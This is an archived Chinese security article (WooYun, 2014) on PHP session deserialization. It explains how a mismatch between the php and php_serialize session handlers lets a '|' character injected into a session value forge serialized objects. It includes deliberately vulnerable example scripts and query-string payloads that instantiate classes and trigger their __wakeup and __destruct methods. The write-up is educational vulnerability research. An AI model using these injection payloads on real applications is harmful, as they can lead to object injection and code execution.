@@ -1,0 +1,49 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">PHP Session 序列化及反序列化处理器设置使用不当带来的安全隐患</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">Ryat</a> <span class="bull">·</span> <time title="2014/11/14 15:05" ui-time="" datetime="2014/11/14 15:05" class="published ng-binding ng-isolate-scope">2014/11/14 15:05</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h2>PHP Session 序列化及反序列化处理器</h2><hr><p>PHP 内置了多种处理器用于存取 $_SESSION 数据时会对数据进行序列化和反序列化，常用的有以下三种，对应三种不同的处理格式：</p><table><thead><tr><th>处理器</th><th>对应的存储格式</th></tr></thead><tbody><tr><td>php</td><td>键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列处理的值</td></tr><tr><td>php_binary</td><td>键名的长度对应的 ASCII 字符 ＋ 键名 ＋ 经过 serialize() 函数反序列处理的值</td></tr><tr><td>php_serialize<br>(php>=5.5.4)</td><td>经过 serialize() 函数反序列处理的数组</td></tr></tbody></table><h2>配置选项 session.serialize_handler</h2><hr><p>PHP 提供了 session.serialize_handler 配置选项，通过该选项可以设置序列化及反序列化时使用的处理器：</p><p><code>session.serialize_handler "php" PHP_INI_ALL</code></p><h2>安全隐患</h2><p>通过上面对存储格式的分析，如果 PHP 在反序列化存储的 $_SESSION 数据时的使用的处理器和序列化时使用的处理器不同，会导致数据无法正确反序列化，通过特殊的构造，甚至可以伪造任意数据：）</p><pre><code>$_SESSION['ryat'] = '|O:8:"stdClass":0:{}';
+</code></pre><p>例如上面的 $&#95;SESSION 数据，在存储时使用的序列化处理器为 php&#95;serialize，存储的格式如下：</p><pre><code>a:1:{s:4:"ryat";s:20:"|O:8:"stdClass":0:{}";}
+</code></pre><p>在读取数据时如果用的反序列化处理器不是 php_serialize，而是 php 的话，那么反序列化后的数据将会变成：</p><pre><code>#!php
+// var_dump($_SESSION);
+array(1) {
+  ["a:1:{s:4:"ryat";s:20:""]=&gt;
+  object(stdClass)#1 (0) {
+  }
+}
+</code></pre><p>可以看到，通过注入 <code>|</code> 字符伪造了对象的序列化数据，成功实例化了 stdClass 对象：）</p><h2>实际利用</h2><hr><h3>i）当 session.auto_start＝On 时：</h3><p>当配置选项 session.auto&#95;start＝On，会自动注册 Session 会话，因为该过程是发生在脚本代码执行前，所以在脚本中设定的包括序列化处理器在内的 session 相关配选项的设置是不起作用的，因此一些需要在脚本中设置序列化处理器配置的程序会在 session.auto&#95;start＝On 时，销毁自动生成的 Session 会话，然后设置需要的序列化处理器，再调用 session_start() 函数注册会话，这时如果脚本中设置的序列化处理器与 php.ini 中设置的不同，就会出现安全问题，如下面的代码：</p><pre><code>#!php
+//foo.php
+
+if (ini_get('session.auto_start')) {
+    session_destroy();
+}
+
+ini_set('session.serialize_handler', 'php_serialize');
+session_start();
+
+$_SESSION['ryat'] = $_GET['ryat'];
+</code></pre><p>当第一次访问该脚本，并提交数据如下：</p><pre><code>foo.php?ryat=|O:8:"stdClass":0:{}
+</code></pre><p>脚本会按照 php_serialize 处理器的序列化格式存储数据：</p><pre><code>a:1:{s:4:"ryat";s:20:"|O:8:"stdClass":0:{}";}
+</code></pre><p>当第二次访问该脚本时，PHP 会按照 php.ini 里设置的序列化处理器反序列化存储的数据，这时如果 php.ini 里设置的是 php 处理器的话，将会反序列化伪造的数据，成功实例化了 stdClass 对象：）</p><p>这里需要注意的是，因为 PHP 自动注册 Session 会话是在脚本执行前，所以通过该方式只能注入 PHP 的内置类。</p><h3>ii）当 session.auto_start＝Off 时：</h3><p>当配置选项 session.auto_start＝Off，两个脚本注册 Session 会话时使用的序列化处理器不同，就会出现安全问题，如下面的代码：</p><pre><code>#!php
+//foo1.php
+
+ini_set('session.serialize_handler', 'php_serialize');
+session_start();
+
+$_SESSION['ryat'] = $_GET['ryat'];
+
+
+//foo2.php
+
+ini_set('session.serialize_handler', 'php');
+//or session.serialize_handler set to php in php.ini 
+session_start();
+
+class ryat {
+    var $hi;
+
+    function __wakeup() {
+        echo 'hi';
+    }
+    function __destruct() {
+        echo $this-&gt;hi;
+    }
+}
+</code></pre><p>当访问 foo1.php 时，提交数据如下：</p><pre><code>foo1.php?ryat=|O:4:"ryat":1:{s:2:"hi";s:4:"ryat";}
+</code></pre><p>脚本会按照 php&#95;serialize 处理器的序列化格式存储数据，访问 foo2.php 时，则会按照 php 处理器的反序列化格式读取数据，这时将会反序列化伪造的数据，成功实例化了 ryat 对象，并将会执行类中的 &#95;&#95;wakeup 方法和 &#95;_destruct 方法：）</p><h3>iii）其他利用方式？</h3><p>请自行发掘：）</p><p>from:<a href="http://www.80vul.com/pch/pch-013.txt">http://www.80vul.com/pch/pch-013.txt</a></p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/tips/3911" rel="bookmark" id="re1">PHP WDDX Serializier Data Injection Vulnerability</a></li><li><a href="http://drops.wooyun.org/tips/2460" rel="bookmark" id="re2">用Burpsuite 来处理csrf token</a></li><li><a href="http://drops.wooyun.org/tips/4988" rel="bookmark" id="re3">PHP中的内存破坏漏洞利用（CVE-2014-8142和CVE-2015-0231）（连载之第二篇）</a></li><li><a href="http://drops.wooyun.org/tips/4482" rel="bookmark" id="re4">利用CSP探测网站登陆状态（alipay/baidu为例）</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">/fd</span> <span class="reply-time">2014-11-14 18:28:56</span></div><p></p><p>The legendary 80vul!</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Demon</span> <span class="reply-time">2014-11-14 16:41:07</span></div><p></p><p>沙发</p><p></p></div></div></div></div></div></main>
